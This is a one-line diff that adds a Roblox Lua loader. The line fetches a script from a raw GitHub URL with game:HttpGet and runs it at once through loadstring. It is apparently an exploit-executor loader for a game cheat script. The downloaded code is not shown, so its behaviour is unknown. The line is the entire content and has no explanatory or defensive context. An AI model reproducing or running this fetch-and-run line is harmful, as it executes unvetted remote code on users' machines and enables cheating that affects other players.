@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/art2282004/scriptikpsx/master/scriptpsx.lua"), true))()
